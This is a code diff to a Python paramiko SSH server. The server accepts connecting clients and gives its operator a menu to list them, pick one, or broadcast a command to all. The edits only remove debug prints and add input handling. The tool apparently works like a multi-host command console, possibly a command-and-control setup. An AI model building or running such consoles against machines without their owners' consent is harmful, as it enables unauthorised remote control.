@@ -13,7 +13,6 @@ port = 5002
 
 def cropkey(skey):
     data = skey.key_blob.split(' ')[1]
-    print(data)
     return data
 
 with open('./key/cli/id_rsa.pub','r') as kf:
@@ -31,10 +30,7 @@ class Server(paramiko.ServerInterface):
             return paramiko.AUTH_SUCCESSFUL
         return paramiko.AUTH_FAILED
     def check_auth_publickey(self, username, key):
-        print(check_key +'  '+key.get_base64())
         if username == 'test' and key.get_base64() == check_key:
-            print('ouiiii')
-           #if key
             return paramiko.AUTH_SUCCESSFUL
         return paramiko.AUTH_FAILED
 
@@ -66,9 +62,6 @@ class Client(threading.Thread):
                     break
             if self.status is None:
                 self.status = False
-
-
-
 
     def run(self):
         with paramiko.Transport(self.client) as t:
@@ -128,6 +121,7 @@ def broadcast(li, cmd):
 
 def print_cli(pipe):
     global killme
+    killme = False
     while True:
         if killme == True:
             break
@@ -169,9 +163,13 @@ while len(clientlist) == 0:
     time.sleep(1)
 
 time.sleep(2)
+c = 0
 while True:
 
-    c = input(' 1/l - list client \n 2/u - use client \n 3/b - send command to all client \n > ')
+    try:
+        c = input(' 1/l - list client \n 2/u - use client \n 3/b - send command to all client \n > ')
+    except EOFError:
+        pass
     if c == '1' or c == 'l':
         list_client(clientlist)
     elif c == '2' or c == 'u':
@@ -179,6 +177,7 @@ while True:
 
         cli_choice = int(input(' Select line number of desired client \n (ID is used to identify same hostname+user combination) \n > '))
 
+        print(clientlist[cli_choice])
         client = clientlist[cli_choice]
         lt = threading.Thread(target=print_cli, args=(client.inbound,))
         lt.start()
